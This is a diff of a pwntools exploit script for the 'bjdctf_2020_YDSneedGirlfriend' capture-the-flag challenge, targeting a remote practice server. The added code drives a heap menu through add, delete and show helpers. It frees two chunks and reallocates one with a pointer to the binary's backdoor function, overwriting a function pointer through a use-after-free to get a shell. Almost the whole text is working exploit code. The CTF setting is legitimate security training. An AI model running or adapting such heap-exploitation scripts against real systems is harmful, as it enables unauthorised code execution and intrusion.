@@ -27,15 +27,31 @@ uu32    = lambda data               :u32(data.ljust(4,'\0'))
 uu64    = lambda data               :u64(data.ljust(8,'\0'))
 leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
 
-context.log_level = 'DEBUG'
-binary = './pwn'
-context.binary = binary
+context(arch='amd64', os='linux', log_level = 'DEBUG')
+binary = './bjdctf_2020_YDSneedGirlfriend'
 elf = ELF(binary)
-p = remote('node3.buuoj.cn',29776) if argv[1]=='r' else process(binary)
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+p = remote('node3.buuoj.cn',29320) if argv[1]=='r' else process(binary)
 
 # start
+def add(size,name='a'):
+	sla(':','1')
+	sla(':',str(size))
+	sla(':',name)
 
+def delete(index):
+	sla(':','2')
+	sla(':',str(index))
+
+def show(index):
+	sla(':','3')
+	sla(':',str(index))
+
+add(0x20)
+add(0x20)
+delete(0)
+delete(1)
+add(0x8,p64(elf.sym['backdoor']))
+show(0)
 # end
 
 itr()
